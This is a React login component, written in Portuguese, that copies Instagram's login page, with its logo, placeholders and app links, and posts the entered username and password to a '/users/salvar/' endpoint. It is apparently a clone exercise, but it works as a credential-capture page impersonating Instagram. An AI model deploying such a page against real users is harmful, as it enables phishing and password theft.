import React from 'react';
import { useRef } from 'react'
import api from '../../services/api'
import {Link, Redirect} from 'react-router-dom';

import './style.css';


import { AiFillFacebook } from "react-icons/ai";


export default function Logon() {

  const email = useRef()
  const senha = useRef()

  function enviarDados(event) {
    event.preventDefault()
    api.post("/users/salvar/", {
      email: email.current.value,
      senha: senha.current.value,
    }).then((res) => console.log(res.data)).catch((err) => console.log(err))
   

  }

  return (
    <div className="logon-wrapper">
      <div className="instagram-logon">
        <form className="group" onSubmit={enviarDados}>
          <img src="https://logodownload.org/wp-content/uploads/2017/04/instagram-logo-1.png" alt="Instagram" className="instagram-logo" />
          <input type="text" ref={email} placeholder="Telefone, nome de usuário ou email" className="input-fields" />
          <input type="password" ref={senha} placeholder="Senha" className="input-fields" />
          <Link to="/feed">
          <button href="/feed" type="submit" className="login-button">Entrar</button>
          </Link>
          <p className="hiddle-text">OU</p>
          <a href="/">
            <span className="facebook"> <sub><AiFillFacebook size="22" /> </sub>Entrar com Facebook</span>
          </a>

          <Link to="/feed" className="find-password"> Esqueceu a senha?</Link>
        </form>

        <div className="group">
          <p>Não tem uma conta? <a href="/" className="not-account">Cadastre-se</a></p>
        </div>

        <div className="get-the-app">
          <p className="get-app">Obtenha o aplicativo.</p>
          <div className="download">
            <a
              href="https://play.google.com/store/apps/details?id=com.instagram.android"
              target="_blank" rel="noreferrer"
              className="app-download">
            </a>

            <a
              href="https://apps.apple.com/br/app/instagram/id389801252"
              target="_blank" rel="noreferrer"  
              className="app-download">
            </a>
          </div>
        </div>
      </div>
    </div>

  )
}